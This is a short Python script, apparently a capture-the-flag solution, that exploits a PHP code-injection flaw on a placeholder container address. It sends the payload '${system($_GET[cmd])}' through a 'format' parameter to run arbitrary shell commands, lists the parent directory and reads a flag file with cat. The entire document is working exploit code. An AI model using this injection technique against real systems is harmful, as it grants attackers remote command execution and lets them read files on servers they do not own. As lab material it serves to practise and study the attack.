import requests
import re

url = "Your_Container_IP"

def exec_cmd(cmd):

	x= requests.get(url,params={'format':'${system($_GET[cmd])}','cmd':f'{cmd}'} )
	return x.text
def get_flag():

	cmd_result = exec_cmd("ls ../")
	flag_filename = re.findall(r'\bflag\w*',cmd_result)[0]
	cmd_result = exec_cmd(f"cat ../{flag_filename}")
	flag  = cmd_result.split('\n')[0]
	print(flag)

if __name__ == '__main__':

	get_flag()
